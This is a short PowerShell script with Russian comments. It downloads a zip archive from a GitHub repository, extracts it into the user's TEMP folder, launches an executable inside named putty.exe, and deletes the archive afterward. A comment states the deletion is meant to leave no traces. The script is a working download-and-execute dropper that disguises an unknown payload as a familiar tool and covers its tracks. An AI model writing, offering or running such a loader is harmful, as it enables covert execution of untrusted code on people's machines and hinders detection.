# Указываем прямые пути
$url = "https://github.com/mahmed9203/under888/raw/refs/heads/main/222.zip"
$temp = $env:TEMP
$zip = "$temp\222.zip"
$dir = "$temp\ex"
$exe = "$dir\putty.exe"

# 1. Скачивание архива
Invoke-WebRequest -Uri $url -OutFile $zip

# 2. Распаковка (создаем папку, если её нет)
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
Expand-Archive -Path $zip -DestinationPath $dir -Force

# 3. Запуск и очистка
if (Test-Path $exe) {
    Start-Process -FilePath $exe
}

# Удаляем архив после запуска, чтобы не оставлять следов
Remove-Item -Path $zip -Force